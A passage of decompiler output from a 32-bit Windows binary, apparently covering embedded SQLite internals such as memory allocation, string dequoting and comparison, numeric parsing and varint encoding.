  int v8; // [esp+0h] [ebp-Ch]
  int v9; // [esp+4h] [ebp-8h]

  if ( !dword_10182160 )
    sub_10053A19(0, a1, 4, (int)off_100FEB7C, v8, v9);
  memset(&dword_101863F8, 0, 0x28u);
  if ( dword_1018214C )
    dword_10186400 = sub_100612DC();
  if ( dword_101821E0 && dword_101821E4 >= 100 && (v1 = dword_101821E8, dword_101821E8 >= 0) )
  {
    dword_101821E4 = (dword_101821E4 - 4) & 0xFFFFFFF8;
    v2 = dword_101821E0 + dword_101821E4 * dword_101821E8;
    v3 = 0;
    dword_10186418 = v2;
    if ( dword_101821E8 > 0 )
    {
      while ( 1 )
      {
        *(_DWORD *)(v2 + 4 * v3) = v3;
        v1 = dword_101821E8;
        if ( ++v3 >= dword_101821E8 )
          break;
        v2 = dword_10186418;
      }
    }
    dword_101863F8 = v1;
  }
  else
  {
    dword_101821E0 = 0;
    dword_101821E4 = 0;
  }
  if ( dword_101821EC && dword_101821F0 >= 512 && dword_101821F4 >= 1 )
  {
    v4 = 0;
    v5 = dword_101821F4
       - (int)((dword_101821F0 & 0xFFFFFFF8) + 4 * dword_101821F4 - 1) / (int)(dword_101821F0 & 0xFFFFFFF8);
    v6 = dword_101821EC + dword_101821F0 * v5;
    dword_101821F4 = v5;
    dword_1018641C = v6;
    if ( v5 > 0 )
    {
      while ( 1 )
      {
        *(_DWORD *)(v6 + 4 * v4) = v4;
        v5 = dword_101821F4;
        if ( ++v4 >= dword_101821F4 )
          break;
        v6 = dword_1018641C;
      }
    }
    dword_101863FC = v5;
  }
  else
  {
    dword_101821EC = 0;
    dword_101821F0 = 0;
  }
  return dword_10182174(dword_1018217C);
}
// 10058A4E: variable 'v8' is possibly undefined
// 10058A4E: variable 'v9' is possibly undefined
// 100FEB7C: using guessed type int (__cdecl *off_100FEB7C[2])(int);
// 1018214C: using guessed type int dword_1018214C;
// 10182160: using guessed type int (__cdecl *dword_10182160)(_DWORD);
// 10182174: using guessed type int (__cdecl *dword_10182174)(_DWORD);
// 1018217C: using guessed type int dword_1018217C;
// 101821E0: using guessed type int dword_101821E0;
// 101821E4: using guessed type int dword_101821E4;
// 101821E8: using guessed type int dword_101821E8;
// 101821EC: using guessed type int dword_101821EC;
// 101821F0: using guessed type int dword_101821F0;
// 101821F4: using guessed type int dword_101821F4;
// 101863F8: using guessed type int dword_101863F8;
// 101863FC: using guessed type int dword_101863FC;
// 10186400: using guessed type int dword_10186400;
// 10186418: using guessed type int dword_10186418;
// 1018641C: using guessed type int dword_1018641C;

//----- (10058B64) --------------------------------------------------------
int __cdecl sub_10058B64(int a1)
{
  int result; // eax
  int v2; // ebx
  int v3; // esi
  void (__cdecl *v4)(int, int, int, int); // edi

  result = dword_10186410;
  if ( dword_10186410 )
  {
    v2 = dword_10186440[0];
    v3 = dword_10186414;
    dword_10186410 = 0;
    v4 = (void (__cdecl *)(int, int, int, int))result;
    sub_10061317(dword_10186400);
    v4(v3, v2, v2 >> 31, a1);
    result = sub_10061305(dword_10186400);
    dword_10186410 = (int)v4;
    dword_10186414 = v3;
  }
  return result;
}
// 10186400: using guessed type int dword_10186400;
// 10186410: using guessed type int dword_10186410;
// 10186414: using guessed type int dword_10186414;
// 10186440: using guessed type int dword_10186440[];

//----- (10058BBD) --------------------------------------------------------
int __cdecl sub_10058BBD(int a1, int *a2)
{
  int v2; // esi
  int v3; // edi

  v2 = dword_10182170(a1);
  sub_100724A3(5, a1);
  if ( dword_10186410 && v2 + dword_10186440[0] >= qword_10186408 )
    sub_10058B64(v2);
  v3 = dword_10182160(v2);
  if ( v3 || dword_10186410 && (sub_10058B64(v2), (v3 = dword_10182160(v2)) != 0) )
  {
    v2 = dword_1018216C(v3);
    sub_10072489(0, v2);
  }
  *a2 = v3;
  return v2;
}
// 10182160: invalid function type has been ignored
// 10182160: using guessed type int (__cdecl *dword_10182160)(_DWORD);
// 1018216C: using guessed type int (__cdecl *dword_1018216C)(_DWORD);
// 10182170: using guessed type int (__cdecl *dword_10182170)(_DWORD);
// 10186408: using guessed type __int64 qword_10186408;
// 10186410: using guessed type int dword_10186410;
// 10186440: using guessed type int dword_10186440[];

//----- (10058C4C) --------------------------------------------------------
int __cdecl sub_10058C4C(int a1)
{
  int v1; // esi

  v1 = a1;
  if ( (unsigned int)(a1 - 1) > 0x7FFFFEFE )
    return 0;
  if ( !dword_10182148 )
    return dword_10182160(a1);
  sub_10061305(dword_10186400);
  sub_10058BBD(v1, &a1);
  sub_10061317(dword_10186400);
  return a1;
}
// 10182148: using guessed type int dword_10182148;
// 10182160: using guessed type int (__cdecl *dword_10182160)(_DWORD);
// 10186400: using guessed type int dword_10186400;

//----- (10058CA3) --------------------------------------------------------
int __cdecl sub_10058CA3(int a1)
{
  if ( sub_1005387F() )
    return 0;
  else
    return sub_10058C4C(a1);
}
// 1005387F: using guessed type int sub_1005387F(void);

//----- (10058CB9) --------------------------------------------------------
int __usercall sub_10058CB9@<eax>(int a1@<edi>)
{
  int v1; // eax
  int v3; // esi
  int v4; // [esp+4h] [ebp-4h] BYREF

  if ( dword_101821E4 >= a1 )
  {
    sub_10061305(dword_10186400);
    if ( dword_101863F8 )
    {
      --dword_101863F8;
      v3 = dword_101821E4 * *(_DWORD *)(dword_10186418 + 4 * dword_101863F8);
      sub_10072489(3, 1);
      sub_100724A3(8, a1);
      sub_10061317(dword_10186400);
      return v3 + dword_101821E0;
    }
    sub_10061317(dword_10186400);
  }
  if ( !dword_10182148 )
    return dword_10182160(a1);
  sub_10061305(dword_10186400);
  sub_100724A3(8, a1);
  v1 = sub_10058BBD(a1, &v4);
  if ( v4 )
    sub_10072489(4, v1);
  sub_10061317(dword_10186400);
  return v4;
}
// 10182148: using guessed type int dword_10182148;
// 10182160: using guessed type int (__cdecl *dword_10182160)(_DWORD);
// 101821E0: using guessed type int dword_101821E0;
// 101821E4: using guessed type int dword_101821E4;
// 101863F8: using guessed type int dword_101863F8;
// 10186400: using guessed type int dword_10186400;
// 10186418: using guessed type int dword_10186418;

//----- (10058D7F) --------------------------------------------------------
unsigned int __usercall sub_10058D7F@<eax>(unsigned int result@<eax>)
{
  unsigned int v1; // esi
  int v2; // esi
  int v3; // edi
  int v4; // edx

  v1 = result;
  if ( result )
  {
    if ( dword_101821E0 && result >= dword_101821E0 && result < dword_10186418 )
    {
      v2 = (int)(result - dword_101821E0) / dword_101821E4;
      sub_10061305(dword_10186400);
      *(_DWORD *)(dword_10186418 + 4 * dword_101863F8++) = v2;
      sub_10072489(3, -1);
      return sub_10061317(dword_10186400);
    }
    else if ( dword_10182148 )
    {
      v3 = dword_1018216C(result);
      sub_10061305(dword_10186400);
      sub_10072489(4, -v3);
      sub_10072489(0, v4);
      dword_10182164(v1);
      return sub_10061317(dword_10186400);
    }
    else
    {
      return dword_10182164(result);
    }
  }
  return result;
}
// 10058E0F: variable 'v4' is possibly undefined
// 10182148: using guessed type int dword_10182148;
// 10182164: using guessed type int (__cdecl *dword_10182164)(_DWORD);
// 1018216C: using guessed type int (__cdecl *dword_1018216C)(_DWORD);
// 101821E0: using guessed type int dword_101821E0;
// 101821E4: using guessed type int dword_101821E4;
// 101863F8: using guessed type int dword_101863F8;
// 10186400: using guessed type int dword_10186400;
// 10186418: using guessed type int dword_10186418;

//----- (10058E36) --------------------------------------------------------
BOOL __usercall sub_10058E36@<eax>(unsigned int a1@<eax>, int a2@<ecx>)
{
  return a2 && a1 && a1 >= *(_DWORD *)(a2 + 240) && a1 < *(_DWORD *)(a2 + 244);
}

//----- (10058E55) --------------------------------------------------------
int __cdecl sub_10058E55(unsigned int a1)
{
  int v1; // ecx
  int v2; // ecx

  if ( sub_10058E36(a1, v1) )
    return *(unsigned __int16 *)(v2 + 224);
  else
    return dword_1018216C(a1);
}
// 10058E5B: variable 'v1' is possibly undefined
// 10058E64: variable 'v2' is possibly undefined
// 1018216C: using guessed type int (__cdecl *dword_1018216C)(_DWORD);

//----- (10058E74) --------------------------------------------------------
void __cdecl sub_10058E74(int a1)
{
  int v1; // eax

  if ( a1 )
  {
    if ( dword_10182148 )
    {
      sub_10061305(dword_10186400);
      v1 = dword_1018216C(a1);
      sub_10072489(0, -v1);
      dword_10182164(a1);
      sub_10061317(dword_10186400);
    }
    else
    {
      dword_10182164(a1);
    }
  }
}
// 10182148: using guessed type int dword_10182148;
// 10182164: using guessed type int (__cdecl *dword_10182164)(_DWORD);
// 1018216C: using guessed type int (__cdecl *dword_1018216C)(_DWORD);
// 10186400: using guessed type int dword_10186400;

//----- (10058EC7) --------------------------------------------------------
void __cdecl sub_10058EC7(int a1, unsigned int a2)
{
  _DWORD *v2; // edx
  int v3; // ecx

  if ( sub_10058E36(a2, a1) )
  {
    *v2 = *(_DWORD *)(v3 + 236);
    --*(_DWORD *)(v3 + 228);
    *(_DWORD *)(v3 + 236) = v2;
  }
  else
  {
    sub_10058E74((int)v2);
  }
}
// 10058EDB: variable 'v3' is possibly undefined
// 10058EE4: variable 'v2' is possibly undefined

//----- (10058EFA) --------------------------------------------------------
int __usercall sub_10058EFA@<eax>(int a1@<ebx>, int a2)
{
  int v3; // esi
  int v4; // edi
  int v5; // esi
  int v6; // eax
  int v7; // [esp+8h] [ebp-4h]

  if ( !a2 )
    return sub_10058C4C(a1);
  if ( a1 <= 0 )
  {
    sub_10058E74(a2);
    return 0;
  }
  if ( a1 >= 2147483392 )
    return 0;
  v3 = dword_1018216C(a2);
  v7 = v3;
  v4 = dword_10182170(a1);
  if ( v3 == v4 )
    return a2;
  if ( !dword_10182148 )
    return dword_10182168(a2);
  sub_10061305(dword_10186400);
  sub_100724A3(5, a1);
  if ( v4 + dword_10186440[0] - v3 >= qword_10186408 )
    sub_10058B64(v4 - v3);
  v5 = dword_10182168(a2);
  if ( v5 || dword_10186410 && (sub_10058B64(a1), (v5 = dword_10182168(a2)) != 0) )
  {
    v6 = dword_1018216C(v5);
    sub_10072489(0, v6 - v7);
  }
  sub_10061317(dword_10186400);
  return v5;
}
// 10182148: using guessed type int dword_10182148;
// 10182168: using guessed type int (__cdecl *dword_10182168)(_DWORD);
// 1018216C: using guessed type int (__cdecl *dword_1018216C)(_DWORD);
// 10182170: using guessed type int (__cdecl *dword_10182170)(_DWORD);
// 10186400: using guessed type int dword_10186400;
// 10186408: using guessed type __int64 qword_10186408;
// 10186410: using guessed type int dword_10186410;
// 10186440: using guessed type int dword_10186440[];

//----- (10059005) --------------------------------------------------------
int __usercall sub_10059005@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4)
{
  if ( sub_1005387F(a2, a3) )
    return 0;
  else
    return sub_10058EFA(a1, a4);
}

//----- (10059025) --------------------------------------------------------
void *__cdecl sub_10059025(size_t Size)
{
  void *v1; // eax
  void *v2; // esi

  v1 = (void *)sub_10058C4C(Size);
  v2 = v1;
  if ( v1 )
    memset(v1, 0, Size);
  return v2;
}

//----- (1005904B) --------------------------------------------------------
_DWORD *__usercall sub_1005904B@<eax>(int a1@<eax>, size_t Size)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi

  v2 = sub_10059073(a1, Size);
  v3 = v2;
  if ( v2 )
    memset(v2, 0, Size);
  return v3;
}

//----- (10059073) --------------------------------------------------------
_DWORD *__usercall sub_10059073@<eax>(int a1@<esi>, int a2)
{
  _DWORD *result; // eax
  int v3; // ecx

  if ( !a1 )
    goto LABEL_9;
  if ( *(_BYTE *)(a1 + 30) )
    return 0;
  if ( *(_BYTE *)(a1 + 226) && a2 <= *(unsigned __int16 *)(a1 + 224) && (result = *(_DWORD **)(a1 + 236)) != 0 )
  {
    *(_DWORD *)(a1 + 236) = *result;
    v3 = ++*(_DWORD *)(a1 + 228);
    if ( v3 > *(_DWORD *)(a1 + 232) )
      *(_DWORD *)(a1 + 232) = v3;
  }
  else
  {
LABEL_9:
    result = (_DWORD *)sub_10058C4C(a2);
    if ( !result && a1 )
      *(_BYTE *)(a1 + 30) = 1;
  }
  return result;
}

//----- (100590DA) --------------------------------------------------------
_DWORD *__cdecl sub_100590DA(int a1, void *Src, int a3)
{
  _DWORD *v3; // edi

  v3 = 0;
  if ( !*(_BYTE *)(a1 + 30) )
  {
    if ( !Src )
      return sub_10059073(a1, a3);
    if ( sub_10058E36((unsigned int)Src, a1) )
    {
      if ( a3 <= *(unsigned __int16 *)(a1 + 224) )
        return Src;
      v3 = sub_10059073(a1, a3);
      if ( v3 )
      {
        memcpy(v3, Src, *(unsigned __int16 *)(a1 + 224));
        sub_10058EC7(a1, (unsigned int)Src);
      }
    }
    else
    {
      v3 = (_DWORD *)sub_10059005(a3, 0, a1, (int)Src);
      if ( !v3 )
        *(_BYTE *)(a1 + 30) = 1;
    }
  }
  return v3;
}

//----- (10059167) --------------------------------------------------------
_DWORD *__cdecl sub_10059167(int a1, void *Src, int a3)
{
  _DWORD *v3; // esi

  v3 = sub_100590DA(a1, Src, a3);
  if ( !v3 )
    sub_10058EC7(a1, (unsigned int)Src);
  return v3;
}

//----- (10059194) --------------------------------------------------------
_DWORD *__cdecl sub_10059194(_BYTE *Src)
{
  _BYTE *v2; // edi
  int v3; // edx
  _DWORD *v4; // eax
  _DWORD *v5; // esi

  if ( !Src )
    return 0;
  v2 = sub_10059297(Src) + 1;
  v4 = sub_10059073(v3, (int)v2);
  v5 = v4;
  if ( v4 )
    memcpy(v4, Src, (size_t)v2);
  return v5;
}
// 100591B1: variable 'v3' is possibly undefined

//----- (100591D0) --------------------------------------------------------
_DWORD *__usercall sub_100591D0@<eax>(int a1@<ecx>, size_t a2@<edi>, void *Src)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi

  if ( !Src )
    return 0;
  v4 = sub_10059073(a1, a2 + 1);
  v5 = v4;
  if ( v4 )
  {
    memcpy(v4, Src, a2);
    *((_BYTE *)v5 + a2) = 0;
  }
  return v5;
}

//----- (10059206) --------------------------------------------------------
void __usercall sub_10059206(unsigned int *a1@<edi>, int a2, char *a3, ...)
{
  int v3; // esi
  va_list va; // [esp+18h] [ebp+10h] BYREF

  va_start(va, a3);
  v3 = sub_10055425(a2, a3, (int *)va);
  sub_10058EC7(a2, *a1);
  *a1 = v3;
}

//----- (1005922F) --------------------------------------------------------
int __usercall sub_1005922F@<eax>(int a1@<esi>, int a2)
{
  int v2; // eax

  if ( a1 )
  {
    if ( *(_BYTE *)(a1 + 30) || a2 == 3082 )
    {
      sub_100592B1((_DWORD *)a1, 7, 0);
      *(_BYTE *)(a1 + 30) = 0;
      a2 = 7;
    }
    v2 = *(_DWORD *)(a1 + 24);
  }
  else
  {
    v2 = 255;
  }
  return a2 & v2;
}

//----- (1005926E) --------------------------------------------------------
int __cdecl sub_1005926E()
{
  return 0;
}

//----- (10059297) --------------------------------------------------------
_BYTE *__fastcall sub_10059297(_BYTE *a1)
{
  _BYTE *result; // eax

  result = a1;
  if ( a1 )
  {
    if ( *a1 )
    {
      do
        ++result;
      while ( *result );
    }
    return (_BYTE *)((result - a1) & 0x3FFFFFFF);
  }
  return result;
}

//----- (100592B1) --------------------------------------------------------
__int16 __usercall sub_100592B1@<ax>(_DWORD *a1@<eax>, int a2, char *a3, ...)
{
  int v3; // esi
  int v4; // edx
  int v5; // esi
  va_list va; // [esp+18h] [ebp+10h] BYREF

  va_start(va, a3);
  v3 = (int)a1;
  if ( a1 )
  {
    if ( a1[50] || (a1 = sub_1005A85A((int)a1), (*(_DWORD *)(v3 + 200) = a1) != 0) )
    {
      LOWORD(a1) = a2;
      *(_DWORD *)(v3 + 20) = a2;
      if ( a3 )
      {
        a1 = (_DWORD *)sub_10055425(v3, a3, (int *)va);
        v4 = *(_DWORD *)(v3 + 200);
        if ( v4 )
          LOWORD(a1) = sub_1005A3FE(sub_10058EC7, v4, -1, a1, 1);
      }
      else
      {
        v5 = *(_DWORD *)(v3 + 200);
        if ( v5 )
          LOWORD(a1) = sub_1005A1F4(v5);
      }
    }
  }
  return (__int16)a1;
}

//----- (10059320) --------------------------------------------------------
int __usercall sub_10059320@<eax>(int *a1@<edi>, char *a2, ...)
{
  int v2; // esi
  int result; // eax
  va_list va; // [esp+10h] [ebp+Ch] BYREF

  va_start(va, a2);
  ++a1[16];
  v2 = *a1;
  sub_10058EC7(*a1, a1[2]);
  result = sub_10055425(v2, a2, (int *)va);
  a1[2] = result;
  a1[1] = 1;
  return result;
}

//----- (1005934E) --------------------------------------------------------
void __usercall sub_1005934E(int *a1@<esi>)
{
  sub_10058EC7(*a1, a1[2]);
  a1[2] = 0;
  a1[16] = 0;
}

//----- (10059363) --------------------------------------------------------
int __thiscall sub_10059363(char *this)
{
  char v2; // dl
  int v3; // esi
  char *v4; // edi
  _BYTE *v5; // ebx

  if ( !this )
    return -1;
  v2 = *this;
  if ( *this != 34 && v2 != 39 )
  {
    if ( v2 == 91 )
    {
      v2 = 93;
    }
    else if ( v2 != 96 )
    {
      return -1;
    }
  }
  v3 = 0;
  if ( this[1] )
  {
    v4 = this + 1;
    v5 = this + 2;
    do
    {
      if ( *v4 == v2 )
      {
        if ( *v5 != v2 )
          break;
        this[v3++] = v2;
        ++v5;
        ++v4;
      }
      else
      {
        this[v3++] = *v4;
      }
      ++v5;
      ++v4;
    }
    while ( *v4 );
  }
  this[v3] = 0;
  return v3;
}

//----- (100593BE) --------------------------------------------------------
int __fastcall sub_100593BE(unsigned __int8 *a1, unsigned __int8 *a2)
{
  unsigned __int8 i; // al

  for ( i = *a1; *a1; ++a2 )
  {
    if ( byte_100FEEC0[i] != byte_100FEEC0[*a2] )
      break;
    i = *++a1;
  }
  return (unsigned __int8)byte_100FEEC0[*a1] - (unsigned __int8)byte_100FEEC0[*a2];
}

//----- (100593F9) --------------------------------------------------------
int __usercall sub_100593F9@<eax>(_BYTE *a1@<eax>, int a2@<edx>, unsigned __int8 *a3@<ecx>)
{
  while ( a2 > 0 )
  {
    --a2;
    if ( !*a1 || byte_100FEEC0[(unsigned __int8)*a1] != byte_100FEEC0[*a3] )
      goto LABEL_7;
    ++a1;
    ++a3;
  }
  --a2;
LABEL_7:
  if ( a2 >= 0 )
    return (unsigned __int8)byte_100FEEC0[(unsigned __int8)*a1] - (unsigned __int8)byte_100FEEC0[*a3];
  else
    return 0;
}

//----- (10059441) --------------------------------------------------------
BOOL __usercall sub_10059441@<eax>(_BYTE *a1@<eax>, _DWORD *a2@<esi>, char a3)
{
  int v3; // edx
  _BYTE *v5; // eax

  v3 = (a3 != 1) + 1;
  if ( a3 == 3 )
    ++a1;
  if ( *a1 == 45 || *a1 == 43 )
    a1 += v3;
  if ( (byte_100FEFC0[(unsigned __int8)*a1] & 4) == 0 )
    return 0;
  v5 = &a1[v3];
  *a2 = 0;
  while ( (byte_100FEFC0[(unsigned __int8)*v5] & 4) != 0 )
    v5 += v3;
  if ( *v5 == 46 )
  {
    v5 += v3;
    if ( (byte_100FEFC0[(unsigned __int8)*v5] & 4) == 0 )
      return 0;
    do
      v5 += v3;
    while ( (byte_100FEFC0[(unsigned __int8)*v5] & 4) != 0 );
    *a2 = 1;
  }
  if ( *v5 == 101 || *v5 == 69 )
  {
    v5 += v3;
    if ( *v5 == 43 || *v5 == 45 )
      v5 += v3;
    if ( (byte_100FEFC0[(unsigned __int8)*v5] & 4) != 0 )
    {
      do
        v5 += v3;
      while ( (byte_100FEFC0[(unsigned __int8)*v5] & 4) != 0 );
      *a2 = 1;
      return *v5 == 0;
    }
    return 0;
  }
  return *v5 == 0;
}

//----- (100594F4) --------------------------------------------------------
_BYTE *__usercall sub_100594F4@<eax>(_BYTE *a1@<eax>, double *a2)
{
  _BYTE *v2; // esi
  int v3; // edi
  unsigned int v4; // ebx
  unsigned __int64 v5; // kr00_8
  unsigned __int64 v6; // kr08_8
  double v7; // st7
  unsigned __int64 v8; // rax
  __int64 v9; // kr10_8
  int v10; // ebx
  int v11; // ecx
  double v12; // st7
  __int64 v13; // rax
  double v14; // st6
  int v15; // eax
  double v16; // st6
  __int64 v18; // [esp+10h] [ebp-2Ch]
  int v20; // [esp+20h] [ebp-1Ch]
  int v21; // [esp+24h] [ebp-18h]
  int v22; // [esp+28h] [ebp-14h]
  int v23; // [esp+2Ch] [ebp-10h]
  int v24; // [esp+2Ch] [ebp-10h]
  int v25; // [esp+30h] [ebp-Ch]
  int v26; // [esp+34h] [ebp-8h]
  int v27; // [esp+34h] [ebp-8h]

  v2 = a1;
  v3 = 0;
  v4 = 0;
  v21 = 1;
  v18 = 0i64;
  v22 = 0;
  v23 = 1;
  v26 = 0;
  v25 = 0;
  while ( (byte_100FEFC0[(unsigned __int8)*v2] & 1) != 0 )
    ++v2;
  if ( *v2 == 45 )
  {
    v21 = -1;
  }
  else if ( *v2 != 43 )
  {
    goto LABEL_9;
  }
  ++v2;
LABEL_9:
  while ( *v2 == 48 )
  {
    ++v2;
    ++v25;
  }
  while ( (byte_100FEFC0[(unsigned __int8)*v2] & 4) != 0 && v3 <= 214748364 && (v3 < 214748364 || v4 < 0xCCCCCCCB) )
  {
    v20 = (char)*v2 - 48;
    v5 = 10 * __PAIR64__(v3, v4) + v20;
    v4 = 10 * v4 + v20;
    v3 = HIDWORD(v5);
    ++v2;
    ++v25;
    v18 = v5;
  }
  while ( (byte_100FEFC0[(unsigned __int8)*v2] & 4) != 0 )
  {
    ++v2;
    ++v25;
    ++v22;
  }
  if ( *v2 == 46 )
  {
    ++v2;
    while ( (byte_100FEFC0[(unsigned __int8)*v2] & 4) != 0 && v3 <= 214748364 && (v3 < 214748364 || v4 < 0xCCCCCCCB) )
    {
      v6 = 10 * __PAIR64__(v3, v4) + (char)*v2 - 48;
      v4 = 10 * v4 + (char)*v2++ - 48;
      ++v25;
      --v22;
      v3 = HIDWORD(v6);
      v18 = v6;
    }
    while ( (byte_100FEFC0[(unsigned __int8)*v2] & 4) != 0 )
    {
      ++v2;
      ++v25;
    }
  }
  if ( *v2 == 101 || *v2 == 69 )
  {
    if ( *++v2 == 45 )
    {
      v23 = -1;
    }
    else if ( *v2 != 43 )
    {
      goto LABEL_37;
    }
    while ( 1 )
    {
      ++v2;
LABEL_37:
      if ( (byte_100FEFC0[(unsigned __int8)*v2] & 4) == 0 )
        break;
      v26 = 10 * v26 + (char)*v2 - 48;
    }
  }
  v27 = v22 + v23 * v26;
  if ( v27 >= 0 )
  {
    v24 = 1;
  }
  else
  {
    v24 = -1;
    v27 = -v27;
  }
  if ( v3 | v4 )
  {
    if ( v24 <= 0 )
    {
      while ( !(__SPAIR64__(v3, v4) % 10) && v27 > 0 )
      {
        --v27;
        v9 = __SPAIR64__(v3, v4) / 10;
        v3 = (unsigned __int64)(__SPAIR64__(v3, v4) / 10) >> 32;
        v4 = v9;
        v18 = __PAIR64__(v3, v9);
      }
    }
    else if ( v3 <= 214748364 )
    {
      if ( v3 >= 214748364 )
        goto LABEL_52;
      while ( v27 > 0 )
      {
        --v27;
        v8 = 10 * __PAIR64__(v3, v4);
        v3 = (10 * __PAIR64__(v3, v4)) >> 32;
        v4 = v8;
        v18 = v8;
        if ( SHIDWORD(v8) >= 214748364 )
        {
          if ( SHIDWORD(v8) > 214748364 )
            break;
LABEL_52:
          if ( v4 >= 0xCCCCCCCC )
            break;
        }
      }
    }
    if ( v21 < 0 )
    {
      v10 = -v4;
      LODWORD(v18) = v10;
      HIDWORD(v18) = (unsigned __int64)-__SPAIR64__(v3, v10) >> 32;
    }
    v11 = v27;
    if ( v27 )
    {
      v12 = 1.0;
      v13 = v27;
      if ( (unsigned int)(v27 - 308) > 0x21 )
      {
        while ( 1 )
        {
          HIDWORD(v13) = v13 % 22;
          if ( !HIDWORD(v13) )
            break;
          v12 = v12 * 10.0;
          v13 = --v11;
        }
        if ( v11 > 0 )
        {
          LODWORD(v13) = v11 - 1;
          v15 = v13 / 0x16ui64 + 1;
          do
          {
            --v15;
            v12 = v12 * 1.0e22;
          }
          while ( v15 );
        }
        v16 = (double)v18;
        if ( v24 >= 0 )
          v7 = v12 * v16;
        else
          v7 = v16 / v12;
      }
      else
      {
        while ( (unsigned int)(v13 % 308) )
        {
          --v27;
          v12 = v12 * 10.0;
          v13 = v27;
        }
        v14 = (double)v18;
        if ( v24 >= 0 )
          v7 = v12 * v14 * 1.0e308;
        else
          v7 = v14 / v12 / 1.0e308;
      }
    }
    else
    {
      v7 = (double)v18;
    }
  }
  else if ( v21 < 0 && v25 )
  {
    v7 = -0.0;
  }
  else
  {
    v7 = 0.0;
  }
  *a2 = v7;
  return (_BYTE *)(v2 - a1);
}

//----- (100597BC) --------------------------------------------------------
int __usercall sub_100597BC@<eax>(char *a1@<esi>)
{
  int result; // eax

  result = 10 * memcmp(a1, a92233720368547, 0x12u);
  if ( !result )
    return a1[18] - 56;
  return result;
}

//----- (100597DB) --------------------------------------------------------
BOOL __usercall sub_100597DB@<eax>(char *a1@<eax>, int *a2)
{
  int v3; // eax
  int v4; // ecx
  int v5; // edi
  char *v7; // [esp+8h] [ebp-10h]
  int v8; // [esp+10h] [ebp-8h]
  int v9; // [esp+14h] [ebp-4h]

  v3 = 0;
  v4 = 0;
  while ( (byte_100FEFC0[(unsigned __int8)*a1] & 1) != 0 )
    ++a1;
  if ( *a1 == 45 )
  {
    v8 = 1;
  }
  else
  {
    v8 = 0;
    if ( *a1 != 43 )
      goto LABEL_8;
  }
  ++a1;
LABEL_8:
  v7 = a1;
  while ( *a1 == 48 )
    ++a1;
  v5 = *a1;
  v9 = 0;
  while ( v5 >= 48 && v5 <= 57 )
  {
    v3 = (v5 + 10 * __PAIR64__(v3, v4) - 48) >> 32;
    v4 = v5 + 10 * v4 - 48;
    v5 = a1[++v9];
  }
  if ( v8 )
  {
    v4 = -v4;
    v3 = (unsigned __int64)-__SPAIR64__(v3, v4) >> 32;
  }
  *a2 = v4;
  a2[1] = v3;
  if ( v5 || !v9 && v7 == a1 || v9 > 19 )
    return 0;
  if ( v9 >= 19 )
    return sub_100597BC(a1) < v8;
  return 1;
}

//----- (100598A1) --------------------------------------------------------
BOOL __usercall sub_100598A1@<eax>(char *a1@<eax>, int a2)
{
  int v2; // edi
  int v4; // eax

  v2 = 0;
  if ( a2 )
    v2 = 1;
  while ( *a1 == 48 )
    ++a1;
  v4 = 0;
  if ( !*a1 )
    return 1;
  do
    ++v4;
  while ( a1[v4] );
  if ( v4 < 19 )
    return 1;
  if ( v4 <= 19 )
    return sub_100597BC(a1) < v2;
  return 0;
}

//----- (100598E8) --------------------------------------------------------
int __usercall sub_100598E8@<eax>(_BYTE *a1@<eax>, int *a2)
{
  _BYTE *v2; // edi
  char v3; // al
  int v4; // ebx
  unsigned int v5; // ecx
  int v6; // esi
  unsigned int v7; // eax
  signed __int64 v9; // kr08_8
  int v10; // [esp+Ch] [ebp-18h]
  int v11; // [esp+20h] [ebp-4h]

  v2 = a1;
  v3 = *a1;
  v4 = 0;
  v5 = 0;
  v10 = 0;
  v11 = 0;
  if ( v3 == 45 )
  {
    v11 = 1;
  }
  else if ( v3 != 43 )
  {
    goto LABEL_5;
  }
  do
  {
    ++v2;
LABEL_5:
    ;
  }
  while ( *v2 == 48 );
  do
  {
    v6 = (char)v2[v4] - 48;
    if ( (unsigned int)v6 > 9 )
      break;
    v7 = (v6 + 10 * __PAIR64__(v5, v10)) >> 32;
    ++v4;
    v10 = v6 + 10 * v10;
    v5 = v7;
  }
  while ( v4 < 11 );
  if ( v4 > 10 )
    return 0;
  v9 = __PAIR64__(v5, v10) - v11;
  if ( v9 >= 0 && (__SPAIR64__(v5, v10) >= v11 && HIDWORD(v9) != 0 || (unsigned int)v9 > 0x7FFFFFFF) )
    return 0;
  if ( v11 )
    v10 = -v10;
  *a2 = v10;
  return 1;
}

//----- (10059996) --------------------------------------------------------
int __usercall sub_10059996@<eax>(_BYTE *a1@<eax>, unsigned __int64 a2)
{
  unsigned int v2; // ecx
  _BYTE *v3; // esi
  unsigned int v4; // eax
  unsigned int v5; // edi
  int i; // edx
  char v7; // cl
  int result; // eax
  unsigned int v9; // edx
  char v10; // bl
  int j; // ecx
  char v12[12]; // [esp+8h] [ebp-Ch]

  v2 = HIDWORD(a2);
  v3 = a1;
  if ( (a2 & 0xFF00000000000000ui64) != 0 )
  {
    a1[8] = a2;
    v4 = a2 >> 8;
    v5 = HIDWORD(a2) >> 8;
    for ( i = 7; i >= 0; --i )
    {
      v7 = v4;
      v4 = __PAIR64__(v5, v4) >> 7;
      v3[i] = v7 | 0x80;
      v5 >>= 7;
    }
    return 9;
  }
  else
  {
    v9 = a2;
    result = 0;
    do
    {
      v10 = v9;
      v9 = __PAIR64__(v2, v9) >> 7;
      v12[result] = v10 | 0x80;
      v2 >>= 7;
      ++result;
    }
    while ( __PAIR64__(v2, v9) );
    v12[0] &= ~0x80u;
    for ( j = result - 1; j >= 0; --j )
      *v3++ = v12[j];
  }
  return result;
}
// 10059996: using guessed type char var_C[12];

//----- (10059A11) --------------------------------------------------------
int __usercall sub_10059A11@<eax>(_BYTE *a1@<eax>, unsigned int a2@<ecx>)
{
  if ( (a2 & 0xFFFFC000) != 0 )
    return sub_10059996(a1, a2);
  *a1 = (a2 >> 7) | 0x80;
  a1[1] = a2 & 0x7F;
  return 2;
}

//----- (10059A38) --------------------------------------------------------
char __usercall sub_10059A38@<al>(unsigned __int8 *a1@<eax>, _DWORD *a2@<esi>)
{
  int v2; // edx
  unsigned __int8 *v4; // eax
  int v5; // ecx
  char *v6; // eax
  int v7; // ebx
  unsigned int v8; // ebx
  unsigned __int8 *v9; // eax
  int v10; // ecx
  int v11; // ecx
  char *v12; // eax
  unsigned int v13; // edi
  unsigned __int8 *v14; // eax
  int v15; // ecx
  unsigned __int8 *v16; // eax
  int v17; // ebx
  int v18; // ecx
  unsigned __int8 *v19; // eax
  int v20; // ebx
  int v21; // ecx
  unsigned __int8 *v22; // eax
